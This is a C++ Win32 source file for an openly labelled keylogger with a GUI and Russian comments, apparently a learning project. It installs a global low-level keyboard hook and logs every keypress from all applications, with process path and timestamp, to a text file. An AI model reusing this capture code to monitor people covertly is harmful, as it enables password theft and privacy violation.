#include "framework.h"
#include "Keylogger.h"
#pragma comment(lib, "Comctl32.lib")


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // Устанавливаем имя для приложения
    wcscpy_s(szTitle, L"Перехватчик нажатий клавиш");
    wcscpy_s(szWindowClass, L"Перехватчик нажатий клавиш");

    MyRegisterClass(hInstance);

    // Инициализация общих элементов управления с помощью библиотеки Common Controls
    InitCommonControls();

    // Выполнить инициализацию приложения:
    if (!InitInstance(hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYLOGGER));
    MSG msg;

    // Цикл основного сообщения:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int)msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SMALL));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_KEYLOGGER);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}


BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    hInst = hInstance; // Сохранить маркер экземпляра в глобальной переменной

    HWND hWnd = CreateWindowW(
        szWindowClass,               // имя класса
        szTitle,                     // заголовок окна
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, // стиль окна
        (GetSystemMetrics(SM_CXSCREEN) - 800) / 2, // Центрирование по горизонтали
        (GetSystemMetrics(SM_CYSCREEN) - 500) / 2, // Центрирование по вертикали
        865,                       // ширина окна
        500,                       // высота окна
        nullptr,                   // родительское окно
        nullptr,                   // меню
        hInstance,                 // экземпляр
        nullptr                    // дополнительные данные
    );

    if (!hWnd)
    {
        return FALSE;
    }

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    // Создание списка ListView
    hwndListView = CreateWindowW(
        WC_LISTVIEW,
        L"",
        WS_BORDER | WS_CHILD | WS_VISIBLE | LVS_REPORT | WS_VSCROLL | WS_HSCROLL,
        0,
        60,
        850,
        381,
        hWnd,
        (HMENU)IDC_LISTVIEW,
        hInstance,
        nullptr
    );

    // Добавление колонок в список ListView
    DefineColumns(hwndListView);

    return TRUE;
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        switch (wmId)
        {
        case IDM_EXIT:
            DestroyWindow(hWnd);
            break;
        case OnClearedField:
            SetWindowTextA(hEditControl, "");
            break;
        case OnCreateFile:
            CreateFileInSelectedFolder(hWnd);
            break;
        case OnReadFile:
            LoadKeyloggerRecordsFromFile(hWnd);
            KeyloggerFilling(hwndListView);
            break;
        case OnOpenFile:
            OpenTextFile();
            break;
        case OnClearedList:
            keyloggerRecords.clear();
            ListView_DeleteAllItems(hwndListView);
            break;
        case OnRecordAction:

            // Меняем текст кнопки в зависимости от состояния
            if (isRecordStarted) {
                SetWindowText(hwndRecordButton, L"Начать запись");

                // Удаляем хук, если запись остановлена
                RemoveKeyboardHook();

                //LoadKeyloggerRecordsFromFile(hWnd);
                //KeyloggerFilling(hwndListView);
            }
            else {
                SetWindowText(hwndRecordButton, L"Остановить запись");

                // Устанавливаем хук, если запись начата
                SetKeyboardHook();
            }

            // Переключаем состояние
            isRecordStarted = !isRecordStarted;

            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
        break;
    }
    case WM_CREATE:
        MainWndAddMenues(hWnd);
        MainWndAddWidgets(hWnd);
        break;
    case WM_DESTROY:
        RemoveKeyboardHook();
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}


// Определение столбцов таблицы
void DefineColumns(HWND hwndLV)
{
    LVCOLUMN lvColumn;
    lvColumn.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;

    // Описание колонок: текст и ширина
    struct ColumnInfo {
        int width;         // Ширина колонки
        const WCHAR* name; // Имя колонки
    };

    ColumnInfo columns[] = {
        { 95, L"ID процесса"},
        { 425, L"Путь к запущенному процессу" },
        { 125, L"Дата и время действия" },
        { 105, L"Код клавиши" },
        { 100, L"Символ" }
    };

    int columnCount = sizeof(columns) / sizeof(columns[0]);

    // Добавление колонок в таблицу
    for (int i = 0; i < columnCount; ++i)
    {
        lvColumn.pszText = const_cast<LPWSTR>(columns[i].name);
        lvColumn.cx = columns[i].width;
        ListView_InsertColumn(hwndLV, i, &lvColumn);
    }
}

void KeyloggerFilling(HWND hwndListView) {
    // Удаляем все элементы перед добавлением новых
    ListView_DeleteAllItems(hwndListView);

    // Заполняем таблицу данными в обратном порядке
    for (int i = static_cast<int>(keyloggerRecords.size()) - 1; i >= 0; --i) {
        const auto& record = keyloggerRecords[i];

        LVITEM lvItem;
        lvItem.mask = LVIF_TEXT;
        lvItem.iItem = static_cast<int>(keyloggerRecords.size()) - 1 - i; // Индекс для верхнего добавления
        lvItem.iSubItem = 0;  // Индекс первого столбца (ID процесса)

        // Заполнение первого столбца (ID процесса)
        std::wstring processIdText = std::to_wstring(record.processId);
        lvItem.pszText = const_cast<LPWSTR>(processIdText.c_str());
        ListView_InsertItem(hwndListView, &lvItem);

        // 2. Путь к запущенному процессу (столбец 1)
        ListView_SetItemText(hwndListView, lvItem.iItem, 1, const_cast<LPWSTR>(record.processPath.c_str()));

        // 3. Дата и время действия (столбец 2)
        ListView_SetItemText(hwndListView, lvItem.iItem, 2, const_cast<LPWSTR>(record.dateTime.c_str()));

        // 4. Код клавиши (столбец 3)
        std::wstring keyCodeText = std::to_wstring(record.keyCode);
        ListView_SetItemText(hwndListView, lvItem.iItem, 3, const_cast<LPWSTR>(keyCodeText.c_str()));

        // 5. Символ клавиши (столбец 4)
        //std::wstring keyCharText(1, record.keyChar);
        ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(record.keyChar.c_str()));
    }
}


// Добавление пунктов меню
void MainWndAddMenues(HWND hwnd) {
    HMENU RootMenu = CreateMenu();
    AppendMenu(RootMenu, MF_STRING, OnCreateFile, L"Создать файл");
    AppendMenu(RootMenu, MF_STRING, OnReadFile, L"Выбрать файл");
    AppendMenu(RootMenu, MF_STRING, OnOpenFile, L"Открыть файл");
    AppendMenu(RootMenu, MF_STRING, OnClearedList, L"Очистить список");
    AppendMenu(RootMenu, MF_STRING, IDM_EXIT, L"Выход");
    SetMenu(hwnd, RootMenu);
}

// Добавление виджетов в рабочую область приложения
void MainWndAddWidgets(HWND hwnd) {
    hwndRecordButton = CreateWindowA("button", "Начать запись", WS_VISIBLE | WS_CHILD | ES_CENTER, 25, 10, 150, 40, hwnd, (HMENU)OnRecordAction, NULL, NULL);

    // Метка для отображения пути к файлу
    hwndFilePathLabel = CreateWindowA("static", "Файл: Не выбран", WS_VISIBLE | WS_CHILD | SS_LEFT, 225, 20, 500, 20, hwnd, NULL, NULL, NULL);
}

// Обработчик события OnOpenFile
void OpenTextFile() {

    // Проверяем, что файл был выбран
    if (filename[0] != '\0') {

        // Открываем файл с помощью связанной программы
        if ((int)ShellExecuteA(NULL, "open", filename, NULL, NULL, SW_SHOW) <= 32) {

            // Если открыть файл не удалось, показываем сообщение об ошибке
            MessageBoxA(NULL, "Не удалось открыть файл.", "Ошибка", MB_OK | MB_ICONERROR);
        }
    }
    else {
        // Если файл не выбран, показываем сообщение
        MessageBoxA(NULL, "Файл не выбран.", "Ошибка", MB_OK | MB_ICONWARNING);
    }
}

// Функция для обновления виджета с путем к файлу
void UpdateFilePathLabel() {
    if (hwndFilePathLabel) {
        // Формируем текст для отображения
        char labelText[512];
        snprintf(labelText, sizeof(labelText), "Файл: %s", filename[0] ? filename : "Не выбран");

        // Обновляем текст в виджете
        SetWindowTextA(hwndFilePathLabel, labelText);
    }
}

// Инициализация структуры OPENFILENAME
void SetOpenFileParams(HWND hwnd) {
    ZeroMemory(&ofn, sizeof(ofn));

    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFile = filename;
    ofn.lpstrFile[0] = '\0'; // Начальное значение пути
    ofn.nMaxFile = sizeof(filename);
    ofn.lpstrFilter = "Text Files\0*.TXT\0All Files\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
}

// Функция парсинга содержимого файла в записи keylogger
std::vector<KeyloggerRecord> ParseKeyloggerData(const std::string& fileContent) {
    std::vector<KeyloggerRecord> keyloggerData;
    std::stringstream stream(fileContent);
    std::string line;

    // Чтение каждой строки из файла
    while (std::getline(stream, line)) {
        if (line.empty()) continue;

        std::stringstream ss(line); // Создаем поток для текущей строки
        std::string part;

        KeyloggerRecord record;

        // Чтение и разбор строки по разделителю ";"
        if (std::getline(ss, part, ';')) {
            record.processId = std::stoul(part); // ID процесса
        }
        if (std::getline(ss, part, ';')) {
            record.processPath = std::wstring(part.begin(), part.end()); // Путь к процессу
        }
        if (std::getline(ss, part, ';')) {
            record.dateTime = std::wstring(part.begin(), part.end()); // Дата и время
        }
        if (std::getline(ss, part, ';')) {
            record.keyCode = std::stoi(part); // Код клавиши
        }
        if (std::getline(ss, part, ';')) {
            record.keyChar = std::wstring(part.begin(), part.end()); // Символ клавиши
        }

        // Добавляем разобранную запись в массив
        keyloggerData.push_back(record);
    }

    return keyloggerData;
}

// Функция для загрузки данных из файла в таблицу
void LoadKeyloggerRecordsFromFile(HWND hwndListView) {
    SetOpenFileParams(hwndListView);

    // Открываем диалог выбора файла
    if (GetOpenFileNameA(&ofn)) {

        // Открываем файл для чтения
        ifstream file(filename);
        if (!file.is_open()) {
            MessageBox(hwndListView, L"Ошибка при открытии файла!", L"Ошибка", MB_OK | MB_ICONERROR);
            return;
        }

        // Считываем содержимое файла в строку
        stringstream fileContent;
        fileContent << file.rdbuf();
        file.close();

        UpdateFilePathLabel();

        // Парсим содержимое файла
        keyloggerRecords = ParseKeyloggerData(fileContent.str());
    }
}


// Функция выбора папки
BOOL SelectFolderDialog(HWND hwnd, char* folderPath) {
    BROWSEINFO bi = { 0 };
    bi.lpszTitle = L"Выберите папку для создания файла";
    bi.ulFlags = BIF_USENEWUI | BIF_RETURNONLYFSDIRS;
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);
    if (pidl) {
        // Получаем путь выбранной папки
        SHGetPathFromIDListA(pidl, folderPath);
        return TRUE;
    }
    return FALSE;
}

void CreateFileInSelectedFolder(HWND hwnd) {
    char folderPath[MAX_PATH];

    if (SelectFolderDialog(hwnd, folderPath)) {
        // Получаем текущую дату и время
        time_t now = time(0);
        struct tm tstruct;
        localtime_s(&tstruct, &now);
        char fileName[64];
        strftime(fileName, sizeof(fileName), "%d%m%Y-%H%M%S.txt", &tstruct);

        // Формируем полный путь к файлу
        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName);  // Сохраняем путь в глобальную переменную

        // Создаем файл в выбранной папке
        HANDLE hFile = CreateFileA(
            filename,  // Используем глобальную переменную для пути
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            MessageBoxA(hwnd, "Файл успешно создан!", "Успех", MB_OK | MB_ICONINFORMATION);
        }
        else {
            MessageBoxA(hwnd, "Не удалось создать файл.", "Ошибка", MB_OK | MB_ICONERROR);
        }

        UpdateFilePathLabel();
    }
    else {
        MessageBoxA(hwnd, "Выбор папки отменен.", "Отмена", MB_OK | MB_ICONINFORMATION);
    }
}

// Функция-словарь для обработки специальных клавиш
wstring GetKeyStringFromCode(int keyCode) {
    switch (keyCode) {

    // Управляющие клавиши
    case VK_RETURN:     return L"ENTER";         // Enter
    case VK_BACK:       return L"BACKSPACE";     // Backspace
    case VK_TAB:        return L"TAB";           // Tab
    case VK_SPACE:      return L"SPACE";         // Space
    case VK_SHIFT:      return L"SHIFT";         // Shift
    case VK_CONTROL:    return L"CTRL";          // Control
    case VK_MENU:       return L"ALT";           // Alt
    case VK_ESCAPE:     return L"ESC";           // Escape
    case VK_CAPITAL:    return L"CAPS LOCK";     // Caps Lock
    case VK_LSHIFT:     return L"LEFT SHIFT";    // Left Shift
    case VK_RSHIFT:     return L"RIGHT SHIFT";   // Right Shift
    case VK_LCONTROL:   return L"LEFT CTRL";     // Left Control
    case VK_RCONTROL:   return L"RIGHT CTRL";    // Right Control
    case VK_LMENU:      return L"LEFT ALT";      // Left Alt
    case VK_RMENU:      return L"RIGHT ALT";     // Right Alt

    // Функциональные клавиши
    case VK_F1:  return L"F1";
    case VK_F2:  return L"F2";
    case VK_F3:  return L"F3";
    case VK_F4:  return L"F4";
    case VK_F5:  return L"F5";
    case VK_F6:  return L"F6";
    case VK_F7:  return L"F7";
    case VK_F8:  return L"F8";
    case VK_F9:  return L"F9";
    case VK_F10: return L"F10";
    case VK_F11: return L"F11";
    case VK_F12: return L"F12";
    case VK_SCROLL: return L"SCROLL LK";

    // Символы на цифровой клавиатуре
    case VK_NUMLOCK: return L"NUM LOCK";
    case VK_NUMPAD0: return L"NUMPAD 0";
    case VK_NUMPAD1: return L"NUMPAD 1";
    case VK_NUMPAD2: return L"NUMPAD 2";
    case VK_NUMPAD3: return L"NUMPAD 3";
    case VK_NUMPAD4: return L"NUMPAD 4";
    case VK_NUMPAD5: return L"NUMPAD 5";
    case VK_NUMPAD6: return L"NUMPAD 6";
    case VK_NUMPAD7: return L"NUMPAD 7";
    case VK_NUMPAD8: return L"NUMPAD 8";
    case VK_NUMPAD9: return L"NUMPAD 9";

    // Специальные клавиши из блока
    case VK_PRIOR:     return L"PAGE UP";        // Page Up
    case VK_NEXT:      return L"PAGE DOWN";      // Page Down
    case VK_END:       return L"END";            // End
    case VK_HOME:      return L"HOME";           // Home
    case VK_LEFT:      return L"LEFT ARROW";     // Left Arrow
    case VK_UP:        return L"UP ARROW";       // Up Arrow
    case VK_RIGHT:     return L"RIGHT ARROW";    // Right Arrow
    case VK_DOWN:      return L"DOWN ARROW";     // Down Arrow
    case VK_SELECT:    return L"SELECT";         // Select
    case VK_PRINT:     return L"PRINT";          // Print
    case VK_EXECUTE:   return L"EXECUTE";        // Execute
    case VK_SNAPSHOT:  return L"PRINT SCREEN";   // Print Screen
    case VK_INSERT:    return L"INSERT";         // Insert
    case VK_DELETE:    return L"DELETE";         // Delete
    case VK_HELP:      return L"HELP";           // Help

    // Символы на клавиатуре
    case VK_OEM_PLUS:   return L"PLUS";          // +
    case VK_OEM_MINUS:  return L"MINUS";         // -
    case VK_OEM_COMMA:  return L"COMMA";         // ,
    case VK_OEM_PERIOD: return L"DOT";           // .

    default: return L"UNKNOWN";                         // Неизвестная клавиша
    }
}

void WriteToFileANSI(const KeyloggerRecord& record) {
    // Конвертируем поля KeyloggerRecord в кодировку ANSI (Windows-1251 по умолчанию)
    int bufferSize = WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, NULL, 0, NULL, NULL);
    char* processPathAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, processPathAnsi, bufferSize, NULL, NULL);

    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, NULL, 0, NULL, NULL);
    char* dateTimeAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, dateTimeAnsi, bufferSize, NULL, NULL);

    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, NULL, 0, NULL, NULL);
    char* keyCharAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, keyCharAnsi, bufferSize, NULL, NULL);

    // Открываем файл для записи в кодировке ANSI
    std::ofstream outFile(filename, std::ios::app);
    if (outFile.is_open()) {
        outFile << record.processId << ";"
            << processPathAnsi << ";"
            << dateTimeAnsi << ";"
            << record.keyCode << ";"
            << keyCharAnsi << std::endl;
        outFile.close();
    }

    // Освобождаем память
    delete[] processPathAnsi;
    delete[] dateTimeAnsi;
    delete[] keyCharAnsi;
}

// Процедура обработки хука клавиатуры
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        // Обрабатываем только нажатие клавиш
        if (wParam == WM_KEYDOWN) {
            DWORD processId;
            GetWindowThreadProcessId(GetForegroundWindow(), &processId);

            // Получаем путь к процессу
            wchar_t processPath[MAX_PATH];
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (hProcess) {
                DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
                CloseHandle(hProcess);
            }

            // Получаем текущее время
            time_t currentTime = time(NULL);
            tm timeInfo;
            localtime_s(&timeInfo, &currentTime);  // Используем localtime_s

            std::wstring dateTime(20, L'\0');  // Строка длиной 20 символов
            wcsftime(&dateTime[0], dateTime.size(), L"%Y-%m-%d %H:%M:%S", &timeInfo);

            // Получаем состояние клавиатуры
            BYTE keyboardState[256];
            BOOL state = GetKeyboardState(keyboardState);  // Состояние клавиш (0-9, латиницы, кириллицы)

            // Буфер для символов
            WCHAR szBuffer[20] = L"";
            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 20, 0);

            // Создаем запись
            KeyloggerRecord record;
            record.processId = processId;
            record.processPath = processPath;
            record.dateTime = dateTime;
            record.keyCode = pKeyboard->vkCode;

            // Карта для отображения специальных клавиш
            static const std::unordered_map<int, std::wstring> specialKeys = {
                {VK_BACK, L"BACKSPACE"},
                {VK_TAB, L"TAB"},
                {VK_RETURN, L"ENTER"},
                {VK_ESCAPE, L"ESC"},
                {VK_SPACE, L"SPACE"}
            };

            // Если символ был получен
            if (nChar > 0) {
                record.keyChar = std::wstring(szBuffer, nChar);  // Преобразуем символы в строку

                // Если это специальная клавиша, заменяем на соответствующее имя
                auto it = specialKeys.find(pKeyboard->vkCode);
                if (it != specialKeys.end()) {
                    record.keyChar = it->second;  // Заменяем на строку для специальной клавиши
                }
            }
            // Если символ не был получен (специальная клавиша), то используем GetKeyStringFromCode
            else {
                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);  // Получаем строку для специальных клавиш
                if (record.keyChar.empty()) {
                    record.keyChar = L"UNKNOWN";  // Устанавливаем значение по умолчанию для неизвестных клавиш
                }
            }


            // Запись в файл только если путь был выбран
            if (filename[0] != 0) {  // Если путь не пуст
                WriteToFileANSI(record);
            }

            // Добавляем запись в список (если нужно)
            keyloggerRecords.push_back(record);

        }
    }

    KeyloggerFilling(hwndListView);

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// Установка хука
void SetKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        MessageBox(NULL, L"Failed to install keyboard hook!", L"Error", MB_OK | MB_ICONERROR);
    }
}

// Удаление хука
void RemoveKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
    }
}
